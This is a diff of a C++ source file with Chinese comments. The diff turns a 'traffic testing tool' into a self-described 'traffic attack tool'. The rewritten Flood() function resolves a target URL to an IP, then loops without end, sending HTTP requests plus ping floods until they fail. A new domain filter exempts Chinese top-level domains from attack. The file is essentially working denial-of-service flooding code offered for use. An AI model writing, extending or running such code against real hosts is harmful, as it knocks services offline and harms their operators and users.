@@ -1,15 +1,22 @@
 /**
- * 网络流量测试工具头文件
+ * 网络流量攻击工具头文件
  */
 #include "TrafficFlood.h"
 
+#include "PingFlood.h"
+
 /**
- * 网络请求库
+ * libcurl库
+ * 用于执行HTTP请求和网络操作
  */
 #include <curl/curl.h>
 
 /**
- * 标准库依赖
+ * C++标准库依赖
+ * chrono: 时间相关操作
+ * iomanip: 输出格式控制
+ * iostream: 标准输入输出
+ * thread: 线程操作
  */
 #include <chrono>
 #include <iomanip>
@@ -17,17 +24,20 @@
 #include <thread>
 
 /**
- * 测试模式标志
+ * 测试模式开关
+ * true: 仅发送3次请求
+ * false: 持续发送请求直到失败
  */
 bool isTest = false;
 
 /**
  * cURL响应数据处理回调函数
- * @param contents 接收到的数据指针
- * @param size 单个数据块大小
- * @param nmemb 数据块数量
- * @param output 输出字符串指针
- * @return 处理的总字节数
+ * 当libcurl接收到服务器响应数据时会调用此函数
+ * @param contents 接收到的原始数据指针
+ * @param size 每个数据块的大小
+ * @param nmemb 数据块的数量
+ * @param output 用于存储响应数据的字符串指针
+ * @return 实际处理的数据字节数
  */
 size_t WriteCallback(void* contents, size_t size, size_t nmemb,
                      std::string* output) {
@@ -37,8 +47,10 @@ size_t WriteCallback(void* contents, size_t size, size_t nmemb,
 }
 
 /**
- * 显示加载动画
- * @param message 显示的消息文本
+ * 加载动画显示函数
+ * 使用Unicode字符显示旋转动画效果
+ * 用于提供视觉反馈，表示程序正在执行
+ * @param message 要显示的提示信息
  */
 void showSpinner(const std::string& message) {
     static const char spinner[] = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏";
@@ -56,47 +68,74 @@ void clearLine() { std::cout << "\r\033[K" << std::flush; }
  * @param url 目标网址
  */
 void TrafficFlood::Flood(std::string url) {
-    std::string ip = URL_TO_IP(url);
-
-    if (url.find("://") == std::string::npos) {
-        url = "http://" + url;
-    }
-
-    std::cout << "\033[1m|> 正在发送流量到目标: " << url + " = " + ip
-              << "\033[0m" << std::endl;
-
-    int counter = 0;
-    if (isTest) {
-        while (counter < 3) {
-            for (int i = 0; i < 10; i++) {
-                showSpinner("第 " + std::to_string(counter + 1) +
-                            " 次请求中...");
-                std::this_thread::sleep_for(std::chrono::milliseconds(1));
-            }
-            clearLine();
-            std::cout << "\033[32m|> 第 " << (counter + 1)
-                      << " 次请求开始\033[0m" << std::endl;
-            if (HttpRequest(ip) != 0) {
-                std::cout << "\033[31m|> 请求失败，停止测试\033[0m"
-                          << std::endl;
-                break;
-            }
-            counter++;
-        }
+    if (url.find(".cn") != std::string::npos ||
+        url.find(".中国") != std::string::npos ||
+        url.find(".xin") != std::string::npos ||
+        url.find(".公司") != std::string::npos ||
+        url.find(".网络") != std::string::npos ||
+        url.find(".gov.cn") != std::string::npos ||
+        url.find(".org.cn") != std::string::npos ||
+        url.find(".com.cn") != std::string::npos ||
+        url.find(".net.cn") != std::string::npos ||
+        url.find(".edu.cn") != std::string::npos ||
+        url.find(".mil.cn") != std::string::npos) {
+        std::cout << "\033[31m|> 流量攻击已被禁用\033[0m" << std::endl;
+        std::cout << "\033[31m|> 中国人不攻击中国人，你知道吗？\033[0m"
+                  << std::endl;
     } else {
-        while (true) {
-            counter++;
-            for (int i = 0; i < 10; i++) {
-                showSpinner("第 " + std::to_string(counter) + " 次请求中...");
-                std::this_thread::sleep_for(std::chrono::milliseconds(1));
+        int counter = 0;
+
+        std::string ip = URL_TO_IP(url);
+
+        if (url.find("://") == std::string::npos) url = "http://" + url;
+
+        std::cout << "\033[1m|> 正在发送流量到目标: " << url + "#" + ip
+                  << "\033[0m" << std::endl;
+
+        if (isTest) {
+            while (counter < 3) {
+                for (int i = 0; i < 10; i++) {
+                    showSpinner("第 " + std::to_string(counter + 1) +
+                                " 次请求中...");
+                    std::this_thread::sleep_for(std::chrono::milliseconds(1));
+                }
+                clearLine();
+                std::cout << "\033[32m|> 第 " << (counter + 1)
+                          << " 次请求开始\033[0m" << std::endl;
+                if (HttpRequest(ip) != 0) {
+                    std::cout << "\033[31m|> 请求失败，停止攻击\033[0m"
+                              << std::endl;
+                    break;
+                } else {
+                    HttpRequest(ip);
+                    PingFlood::SendPing(ip);
+                }
+
+                counter++;
             }
-            clearLine();
-            std::cout << "\033[32m|> 第 " << counter << " 次请求开始\033[0m"
-                      << std::endl;
-            if (HttpRequest(ip) != 0) {
-                std::cout << "\033[31m|> 请求失败，停止测试\033[0m"
+        } else {
+            while (true) {
+                for (int i = 0; i < 1000; i++) {
+                    showSpinner("第 " + std::to_string(counter) +
+                                " 次请求中...");
+                    std::this_thread::sleep_for(std::chrono::milliseconds(1));
+                }
+
+                clearLine();
+
+                std::cout << "\033[32m|> 第 " << counter << " 次请求开始\033[0m"
                           << std::endl;
-                break;
+
+                if (HttpRequest(ip) != 0 && !PingFlood::SendPing(ip)) {
+                    std::cout << "\033[31m|> 请求失败，停止攻击\033[0m"
+                              << std::endl;
+                    break;
+                } else {
+                    HttpRequest(ip);
+                    PingFlood::SendPing(ip);
+                }
+
+                counter++;
             }
         }
     }
@@ -150,6 +189,7 @@ int TrafficFlood::HttpRequest(std::string url) {
         char* content_type;
 
         curl_easy_getinfo(curl, CURLINFO_CONTENT_TYPE, &content_type);
+
         if (content_type) {
             std::cout << "| 内容类型       | " << content_type
                       << std::setw(22 - strlen(content_type)) << "|\n";
@@ -157,13 +197,17 @@ int TrafficFlood::HttpRequest(std::string url) {
 
         if (headers) {
             std::cout << "| Cookie         | ";
+
             struct curl_slist* curr = headers;
             bool first = true;
+
             while (curr) {
                 if (!first) std::cout << "                | ";
+
                 std::cout << curr->data << std::setw(22 - strlen(curr->data))
                           << "|\n";
                 first = false;
+
                 curr = curr->next;
             }
             curl_slist_free_all(headers);
@@ -193,14 +237,11 @@ std::string TrafficFlood::URL_TO_IP(std::string url) {
     if (curl) {
         size_t pos = url.find("://");
 
-        if (pos != std::string::npos) {
-            url = url.substr(pos + 3);
-        }
+        if (pos != std::string::npos) url = url.substr(pos + 3);
 
         pos = url.find("/");
-        if (pos != std::string::npos) {
-            url = url.substr(0, pos);
-        }
+
+        if (pos != std::string::npos) url = url.substr(0, pos);
 
         curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
         curl_easy_setopt(curl, CURLOPT_RESOLVE, &dns);
@@ -221,17 +262,28 @@ std::string TrafficFlood::URL_TO_IP(std::string url) {
     return ip.empty() ? url : ip;
 }
 
+/**
+ * URL可访问性检查函数
+ * 验证目标URL是否可以访问
+ * 特点：
+ * 1. 使用HEAD请求提高效率
+ * 2. 设置5秒超时限制
+ * 3. 支持自动跟随重定向
+ * 4. 通过HTTP状态码判断可访问性
+ * @param url 要检查的URL
+ * @return true表示可访问，false表示不可访问
+ */
 bool TrafficFlood::IsURLExist(std::string url) {
     CURL* curl = curl_easy_init();
     if (!curl) return false;
 
     curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);           
-    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);          
-    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);   // Follow redirects
+    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
+    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
 
     CURLcode res = curl_easy_perform(curl);
-    
+
     if (res != CURLE_OK) {
         curl_easy_cleanup(curl);
         return false;
@@ -241,5 +293,5 @@ bool TrafficFlood::IsURLExist(std::string url) {
     curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
     curl_easy_cleanup(curl);
 
-    return (response_code >= 200 && response_code < 400);  
+    return (response_code >= 200 && response_code < 400);
 }
